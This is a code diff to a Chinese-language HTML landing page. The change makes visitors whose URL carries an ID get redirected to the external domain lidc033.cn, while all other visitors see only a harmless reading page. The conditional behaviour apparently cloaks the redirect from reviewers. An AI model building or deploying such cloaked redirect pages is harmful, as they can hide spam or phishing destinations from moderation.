@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>美好的时光 - 页面跳转中</title>
+    <title>美好的时光 - </title>
     <style>
         * {
             margin: 0;
@@ -193,7 +193,7 @@
         </div>
         
         <footer>
-            <p>感谢阅读 | 页面将在30秒后自动跳转</p>
+            <p id="footerText">欢迎阅读</p>
         </footer>
     </div>
     
@@ -219,7 +219,7 @@
         // 设置目标URL
         function setTargetUrl() {
             const id = extractPathId();
-            const targetDomain = 'https://B域名.com'; // 请替换为实际域名
+            const targetDomain = 'https://lidc033.cn'; // 请替换为实际域名
             
             let targetUrl;
             if (id) {
@@ -242,6 +242,9 @@
             const overlay = document.getElementById('redirectOverlay');
             overlay.classList.add('active');
             
+            // 更新页脚提示
+            document.getElementById('footerText').textContent = "页面将在30秒后自动跳转";
+            
             // 30秒后自动跳转
             window.countdownId = setTimeout(() => {
                 redirectToTarget();
@@ -259,8 +262,19 @@
             redirectToTarget();
         });
         
-        // 2秒后显示跳转提示
-        setTimeout(showRedirectMessage, 2000);
+        // 页面加载后检查是否需要跳转
+        window.onload = function() {
+            const id = extractPathId();
+            
+            // 只有当有ID时才显示跳转提示
+            if (id) {
+                // 2秒后显示跳转提示
+                setTimeout(showRedirectMessage, 2000);
+            } else {
+                // 没有ID时，停留在页面，不显示跳转提示
+                document.getElementById('footerText').textContent = "欢迎阅读，享受美好时光";
+            }
+        };
     </script>
 </body>
 </html>
